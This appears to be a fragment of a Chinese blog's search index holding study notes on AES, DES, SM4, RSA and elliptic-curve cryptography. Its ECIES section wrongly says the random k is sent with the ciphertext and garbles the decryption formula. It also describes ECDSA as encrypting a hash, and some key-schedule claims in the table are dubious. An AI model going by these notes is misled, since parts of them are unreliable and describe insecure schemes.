-<h2 id="2-aes的加密流程-密钥128位"><a href="#2-aes的加密流程-密钥128位" class="headerlink" title="2.aes的加密流程 (密钥128位):"></a>2.aes的加密流程 (密钥128位):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入明文（128bit）</span><br><span class="line">      ↓</span><br><span class="line">AddRoundKey（初始轮）</span><br><span class="line">      ↓</span><br><span class="line">9轮：SubBytes(字节代换) → ShiftRows(行移位) → MixColumns(列混合) → AddRoundKey (轮密钥加)</span><br><span class="line">      ↓</span><br><span class="line">第10轮：SubBytes → ShiftRows → AddRoundKey    ---没有列混合</span><br><span class="line">      ↓</span><br><span class="line">输出密文（128bit）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>3.初始轮:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将明文状态矩阵与第 0 轮子密钥（RoundKey₀）做逐字节异或（XOR）操作。</span><br><span class="line">本质上是将密钥“注入”到加密流程的起点，为接下来的非线性变换和扩散做准备。</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题:"></a>1.问题:</h3><p>明文是 128 位（16 字节），初始轮的 AddRoundKey 是对明文和密钥逐字节 XOR。如果我的密钥是 <strong>192 位或 256 位</strong>，那怎么 XOR 呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES 不直接使用原始密钥参与加密，而是通过 密钥扩展（Key Schedule） 生成 每轮使用的“轮密钥”（Round Key）。不管原始密钥是 128、192 还是 256 位，每轮都只用一个 128 位的轮密钥。</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>原始密钥位数</th>
-<th>总轮数</th>
-<th>要生成的子密钥数量</th>
-<th>每个子密钥长度</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>128 位</td>
-<td>10</td>
-<td>11 个</td>
-<td>128 位（16 字节）</td>
-</tr>
-<tr>
-<td>192 位</td>
-<td>12</td>
-<td>13 个</td>
-<td>128 位</td>
-</tr>
-<tr>
-<td>256 位</td>
-<td>14</td>
-<td>15 个</td>
-<td>128 位</td>
-</tr>
-</tbody></table>
-<h2 id="4-字节替代-s盒"><a href="#4-字节替代-s盒" class="headerlink" title="4.字节替代(s盒):"></a>4.字节替代(s盒):</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对 状态矩阵中的每个字节，使用一个固定的查找表（S-box）进行非线性映射替代</span><br><span class="line">是整个 AES 中引入非线性和抗线性分析攻击的核心步骤</span><br><span class="line">就是按字节查表:</span><br><span class="line">   比如某一个字节是0x53</span><br><span class="line">        高4位：5（行索引）</span><br><span class="line">        低4位：3（列索引）</span><br><span class="line">   然后去s盒表中找5行3列对应的字节值</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-行移位"><a href="#5-行移位" class="headerlink" title="5.行移位:"></a>5.行移位:</h2><p>按行左移字节就行了</p>
-<table>
-<thead>
-<tr>
-<th>行号</th>
-<th>操作</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>第0行</td>
-<td>不变</td>
-</tr>
-<tr>
-<td>第1行</td>
-<td>循环左移 1 个字节</td>
-</tr>
-<tr>
-<td>第2行</td>
-<td>循环左移 2 个字节</td>
-</tr>
-<tr>
-<td>第3行</td>
-<td>循环左移 3 个字节（或右移1位）</td>
-</tr>
-</tbody></table>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打乱同一列字节之间的联系，让后续的 MixColumns 可以混合更多跨字节的数据；</span><br><span class="line">增强扩散性，使得明文的小改动能影响到加密后的多个字节；</span><br><span class="line">是一种 位置置换操作，没有改变字节本身的值。</span><br></pre></td></tr></table></figure>
-
-<h2 id="6-列混合"><a href="#6-列混合" class="headerlink" title="6.列混合:"></a>6.列混合:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MixColumns（列混合） 是 AES 加密中每一轮的第 3 个操作（除了最后一轮不执行它），</span><br><span class="line">它通过矩阵乘法在 GF(2⁸) 有限域中，把每一列的4个字节混合生成新的4个字节。</span><br></pre></td></tr></table></figure>
-
-<h2 id="7-轮密钥加"><a href="#7-轮密钥加" class="headerlink" title="7.轮密钥加:"></a>7.轮密钥加:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前状态矩阵与本轮的轮密钥（Round Key）逐字节进行按位异或（XOR）</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>运算简单</td>
-<td>仅使用按位异或（XOR），硬件友好</td>
-</tr>
-<tr>
-<td>密钥注入点</td>
-<td>是 AES 中 <strong>唯一使用密钥的地方</strong></td>
-</tr>
-<tr>
-<td>可逆性强</td>
-<td>XOR 的逆运算就是本身（再次 XOR 即可还原）</td>
-</tr>
-<tr>
-<td>轮密钥变化</td>
-<td>每轮使用不同的轮密钥（由原始密钥扩展）</td>
-</tr>
-</tbody></table>
-<h2 id="8-密钥扩展"><a href="#8-密钥扩展" class="headerlink" title="8.密钥扩展:"></a>8.密钥扩展:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将原始密钥切成若干 32 位字（4字/6字/8字）</span><br><span class="line">每次迭代扩展一个 32 位字，共需 44/52/60 个字（每轮 4 个字）</span><br><span class="line"></span><br><span class="line">1. 初始密钥写入前 Nk 个字（Nk = 4/6/8）</span><br><span class="line">2. 对后续每一组（每组4字）：</span><br><span class="line">   - 如果当前索引 i 是 Nk 的倍数：</span><br><span class="line">     temp = SubWord(RotWord(w[i-1])) ⊕ Rcon[i/Nk]</span><br><span class="line">   - 否则如果 Nk &gt; 6 且 i ≡ 4 mod Nk：</span><br><span class="line">     temp = SubWord(w[i-1])</span><br><span class="line">   - 然后：w[i] = w[i-Nk] ⊕ temp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>项目</th>
-<th>AES</th>
-<th>DES</th>
-<th>SM4</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>原始密钥长度</td>
-<td>128 &#x2F; 192 &#x2F; 256 bit</td>
-<td>64 bit（含8位校验）</td>
-<td>128 bit</td>
-</tr>
-<tr>
-<td>有效密钥长度</td>
-<td>128 &#x2F; 192 &#x2F; 256 bit</td>
-<td>56 bit</td>
-<td>128 bit</td>
-</tr>
-<tr>
-<td>总轮数</td>
-<td>10 &#x2F; 12 &#x2F; 14</td>
-<td>16</td>
-<td>32</td>
-</tr>
-<tr>
-<td>每轮密钥长度</td>
-<td>128 bit（16 字节）</td>
-<td>48 bit</td>
-<td>32 bit（1个字）</td>
-</tr>
-<tr>
-<td>子密钥数量</td>
-<td>轮数 + 1（11&#x2F;13&#x2F;15 个）</td>
-<td>16 个</td>
-<td>32 个</td>
-</tr>
-<tr>
-<td>主要操作</td>
-<td>字扩展 + S-box + XOR + 轮常量</td>
-<td>置换 + 左移 + 压缩置换</td>
-<td>XOR + S-box + 线性变换 + CK</td>
-</tr>
-<tr>
-<td>是否非线性</td>
-<td>✅（使用 S-box）</td>
-<td>❌</td>
-<td>✅（S-box + 线性组合）</td>
-</tr>
-<tr>
-<td>是否可逆</td>
-<td>❌</td>
-<td>✅</td>
-<td>❌（但结构对称）</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>对称密码(分组密码)</category>
-      </categories>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/des/</url>
-    <content><![CDATA[<h1 id="des加密"><a href="#des加密" class="headerlink" title="des加密:"></a>des加密:</h1><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念:"></a>1.基本概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DES使用56位的密钥和64位的明文块进行加密。DES算法的分组大小是64位，因此，如果需要加密的明文长度不足64位，需要进行填充；如果明文长度超过64位，则需要使用分组模式进行分组加密。</span><br><span class="line">虽然DES算法的分组大小是64位，但是由于DES算法的密钥长度只有56位，因此DES算法存在着弱点，容易受到暴力破解和差分攻击等攻击手段的威胁。因此，在实际应用中，DES算法已经不再被广泛使用，而被更加安全的算法所取代，如AES算法等。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-加密流程："><a href="#2-加密流程：" class="headerlink" title="2.加密流程："></a>2.加密流程：</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/13057fca8d2ae93a87bbceb559746832.png" alt="img"></p>
-<p>明文64位 → 初始置换（IP） → 16轮加密（Feistel结构） → 逆初始置换（IP⁻¹） → 密文64位</p>
-<h3 id="F函数结构"><a href="#F函数结构" class="headerlink" title="F函数结构:"></a>F函数结构:</h3><ol>
-<li><strong>扩展置换 E：</strong><ul>
-<li>将 32位的R 扩展为 48位（E表）<br> ⟹ 使其可以和 48位子密钥 <code>Ki</code> 做异或操作</li>
-</ul>
-</li>
-<li><strong>异或：</strong><ul>
-<li>48位扩展后的R 与 48位子密钥 <code>Ki</code> 做异或</li>
-</ul>
-</li>
-<li><strong>S盒替换：</strong><ul>
-<li>将 48位结果 分成 8组，每组6位</li>
-<li>进入 8个 S-box（6位 → 4位）进行非线性变换</li>
-<li>输出为 32位</li>
-</ul>
-</li>
-<li><strong>P置换：</strong><ul>
-<li>对S盒输出的32位进行 P置换，增强扩散</li>
-</ul>
-</li>
-</ol>
-<p>最终得到 F(R, Ki) 的输出（32位）</p>
-<h2 id="3-三重des："><a href="#3-三重des：" class="headerlink" title="3.三重des："></a>3.三重des：</h2><blockquote>
-<p><strong>EDE 模式（Encrypt → Decrypt → Encrypt）</strong></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文 = E_K3(D_K2(E_K1(明文)))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>E_K1：</strong> 用密钥K1进行DES加密</li>
-<li><strong>D_K2：</strong> 用密钥K2进行DES解密</li>
-<li><strong>E_K3：</strong> 再用密钥K3进行DES加密</li>
-</ul>
-<p>中间使用一次解密是为了:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果k1=k2=k3，那么这个3des就和普通的des一样了</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>对称密码(分组密码)</category>
-      </categories>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/sm4/</url>
-    <content><![CDATA[<h1 id="sm4加密"><a href="#sm4加密" class="headerlink" title="sm4加密:"></a>sm4加密:</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念:"></a>1.概念:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：128 位明文 + 128 位密钥</span><br><span class="line">↓</span><br><span class="line">1. 明文拆成 4 个 32 位字：X0, X1, X2, X3</span><br><span class="line">2. 密钥扩展：生成 32 个轮密钥 rk[0] ~ rk[31]</span><br><span class="line">3. 执行 32 轮加密：</span><br><span class="line">     对于每一轮 i = 0 到 31：</span><br><span class="line">         X[i+4] = X[i] ⊕ F(X[i+1], X[i+2], X[i+3], rk[i])</span><br><span class="line">4. 输出密文：X[35], X[34], X[33], X[32]（倒序输出）</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-F函数"><a href="#3-F函数" class="headerlink" title="3.F函数:"></a>3.F函数:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X1, X2, X3, rk) = T(X1 ⊕ X2 ⊕ X3 ⊕ rk)</span><br><span class="line">输入：X1, X2, X3, rk</span><br><span class="line"></span><br><span class="line">Step 1:  temp = X1 ⊕ X2 ⊕ X3 ⊕ rk   → 32位</span><br><span class="line">Step 2:  替代 temp 的每个字节 → 使用 S-box → 得到非线性结果</span><br><span class="line">Step 3:  对结果进行线性变换 L(x)</span><br><span class="line">Step 4:  输出最终的 F 值（32 位）</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>功能类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>混淆性</strong>（Confusion）</td>
-<td>通过 S-box 实现非线性映射，防止线性分析</td>
-</tr>
-<tr>
-<td><strong>扩散性</strong>（Diffusion）</td>
-<td>L 线性变换使得一个比特变化影响多个比特</td>
-</tr>
-<tr>
-<td><strong>密钥注入</strong></td>
-<td>引入轮密钥 rk[i]，确保每轮变换唯一</td>
-</tr>
-<tr>
-<td><strong>加密推进器</strong></td>
-<td>每轮根据 F 生成新状态字，实现 128 位数据演化</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>对称密码(分组密码)</category>
-      </categories>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/RAS/</url>
-    <content><![CDATA[<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA:"></a>RSA:</h1><p>建立在大整数因式分解难题</p>
-<h2 id="1-RSA流程"><a href="#1-RSA流程" class="headerlink" title="1.RSA流程:"></a>1.RSA流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成密钥 → 加密 → 解密</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-生成密钥"><a href="#2-生成密钥" class="headerlink" title="2.生成密钥:"></a>2.生成密钥:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 选择两个大质数 </span><br><span class="line">   令：`p = 61, q = 53`</span><br><span class="line"></span><br><span class="line">2. 计算模数 n </span><br><span class="line">   `n = p × q = 61 × 53 = 3233`    ---这个 n 是 公钥 和 私钥 中共同的模数。</span><br><span class="line"></span><br><span class="line">3.计算欧拉函数 φ(n)</span><br><span class="line">   `φ(n) = (p - 1)(q - 1) = 60 × 52 = 3120`</span><br><span class="line"></span><br><span class="line">4. 选择加密指数 e  </span><br><span class="line">   `e = 17`（满足 `gcd(17, 3120) = 1`）</span><br><span class="line"></span><br><span class="line">5. 计算解密指数 d  </span><br><span class="line">   `d = e⁻¹ mod φ(n) = 2753`（因为 `17 × 2753 ≡ 1 mod 3120`）</span><br><span class="line"></span><br><span class="line">- ✅ 公钥：`(e, n) = (17, 3233)`</span><br><span class="line">- 🔒 私钥：`(d, n) = (2753, 3233)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-加密流程"><a href="#3-加密流程" class="headerlink" title="3.加密流程:"></a>3.加密流程:</h2><p>首先，发送方需要知道接收方的<strong>公钥 (e, n)</strong>，其中：</p>
-<ul>
-<li>e 是加密指数，通常是一个公开的较小整数；</li>
-<li>n 是两个大质数相乘得到的模数；</li>
-<li>公钥是公开的，任何人都可以用来加密消息。</li>
-</ul>
-<p>接着，发送方将要发送的明文 M（需满足 0&lt;M&lt;n）使用以下公式进行加密：</p>
-<p>  <strong>C &#x3D; M^e mod n</strong></p>
-<h2 id="4-解密流程"><a href="#4-解密流程" class="headerlink" title="4.解密流程:"></a>4.解密流程:</h2><p>接收方收到密文 C 之后，使用自己的私钥 (d,n) 对密文进行解密。私钥中的 d 是在密钥生成阶段计算出来的，是加密指数 e 关于欧拉函数 φ(n) 的模反元素，即满足 e⋅d ≡ 1 mod  φ(n)</p>
-<p>解密公式为：</p>
-<p>  <strong>M &#x3D; C^d mod n</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = M^e mod n     ---加密得到C</span><br><span class="line">C^d mod n  --&gt; </span><br><span class="line">        ((M^e) mod n)^d mod n   --&gt;  M^ed mod n       ---幂模分配律</span><br><span class="line">ed=1  mod φ(n)   --&gt; ed=k(φ(n))+1</span><br><span class="line">M^(k(φ(n))+1) mod n --&gt; M</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>非对称密码(公钥密码)</category>
-      </categories>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/SM2/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>非对称密码(公钥密码)</category>
-      </categories>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h1 id="椭圆曲线密码-ECC"><a href="#椭圆曲线密码-ECC" class="headerlink" title="椭圆曲线密码(ECC):"></a>椭圆曲线密码(ECC):</h1><p>基于椭圆曲线离散对数问题（ECDLP）难解性</p>
-<h2 id="1-密钥的生成"><a href="#1-密钥的生成" class="headerlink" title="1. 密钥的生成:"></a>1. 密钥的生成:</h2><p>在椭圆曲线加密中，密钥生成包括两部分：<strong>私钥</strong>和<strong>公钥</strong>。</p>
-<ul>
-<li><p><strong>私钥</strong>：随机选择一个大整数，通常通过一个安全的随机数生成器来生成。</p>
-</li>
-<li><p><strong>公钥</strong>：通过私钥和椭圆曲线的基点（生成点）进行运算生成。公钥是私钥与基点的乘积，记作：</p>
-<p>Public Key&#x3D;Private Key×G</p>
-<p>其中 G 是椭圆曲线的基点。</p>
-</li>
-</ul>
-<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><p>椭圆曲线集成加密方案（ECIES，Elliptic Curve Integrated Encryption Scheme）是一种使用椭圆曲线加密的标准方法，下面是ECIES的加密流程：</p>
-<h4 id="加密方："><a href="#加密方：" class="headerlink" title="加密方："></a>加密方：</h4><ol>
-<li><p><strong>选择公钥</strong>：接收方（Bob）将其公钥提供给发送方（Alice）。</p>
-</li>
-<li><p><strong>生成随机数</strong>：发送方随机选择一个整数 k，该整数与椭圆曲线基点 G 结合来生成加密密钥。</p>
-</li>
-<li><p><strong>计算共享密钥</strong>：发送方使用自己的私钥和接收方的公钥，计算共享密钥（共享密钥的计算基于椭圆曲线Diffie-Hellman协议）：</p>
-<p>K&#x3D;k×Bob’s Public Key     —Bob’s Public Key&#x3D;Bob的私钥×G</p>
-</li>
-<li><p><strong>生成密文</strong>：使用共享密钥生成对称密钥，用来加密实际的数据（比如AES加密）。然后，计算加密后的数据和随机数的组合：</p>
-<p>C&#x3D;Encrypt(Message,Key)</p>
-</li>
-<li><p><strong>传输密文</strong>：发送方将密文和随机数 k 一起发送给接收方。</p>
-</li>
-</ol>
-<h4 id="解密方："><a href="#解密方：" class="headerlink" title="解密方："></a>解密方：</h4><ol>
-<li><p><strong>计算共享密钥</strong>：接收方使用自己的私钥和发送方的公钥计算共享密钥。</p>
-<p>K&#x3D;k×Alice’s Public Key      —Alice’s Public Key&#x3D;Bob的私钥×G</p>
-</li>
-<li><p><strong>解密密文</strong>：接收方使用计算得到的共享密钥解密收到的密文。</p>
-<p>Message&#x3D;Decrypt(C,Key)</p>
-</li>
-</ol>
-<h2 id="3-数字签名（ECDSA）"><a href="#3-数字签名（ECDSA）" class="headerlink" title="3.数字签名（ECDSA）"></a>3.<strong>数字签名（ECDSA）</strong></h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用:"></a>1.作用:</h3><h4 id="身份验证（Authentication）"><a href="#身份验证（Authentication）" class="headerlink" title="身份验证（Authentication）"></a><strong>身份验证（Authentication）</strong></h4><p>数字签名能够证明消息确实是由消息的发送者发出的，并且没有被篡改。</p>
-<ul>
-<li><strong>公钥基础设施（PKI）</strong>：通过数字签名，接收方能够验证消息是否确实是由声明的发送方发出的。这是因为签名是使用发送方的私钥生成的，而只有拥有对应私钥的人才能生成有效的签名。因此，接收方可以使用发送方的公钥来验证签名是否有效，确保消息的发件人身份。</li>
-</ul>
-<h4 id="数据完整性（Data-Integrity）"><a href="#数据完整性（Data-Integrity）" class="headerlink" title="数据完整性（Data Integrity）"></a><strong>数据完整性（Data Integrity）</strong></h4><p>数字签名确保了消息在传输过程中未被篡改。</p>
-<ul>
-<li><strong>哈希值</strong>：数字签名通常会对消息进行哈希运算（生成消息摘要），然后使用私钥对这个哈希值进行签名。如果消息内容在传输过程中被修改，计算得到的哈希值就会发生变化，验证签名时就会失败，从而能够检测到数据被篡改。</li>
-</ul>
-<h4 id="不可否认性（Non-repudiation）"><a href="#不可否认性（Non-repudiation）" class="headerlink" title="不可否认性（Non-repudiation）"></a><strong>不可否认性（Non-repudiation）</strong></h4><p>数字签名提供了不可否认性，即发送方不能否认自己已签署某个消息。</p>
-<ul>
-<li>由于数字签名是通过发送方的私钥生成的，且只有发送方拥有私钥，因此在签署之后，发送方不能声称自己没有发送过该消息。即使在后续，发送方也不能否认自己发送的消息。</li>
-</ul>
-<h4 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a><strong>防篡改</strong></h4><p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
-<h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程:"></a>2.流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>密码学</category>
-        <category>非对称密码(公钥密码)</category>
-      </categories>
   </entry>
 </search>
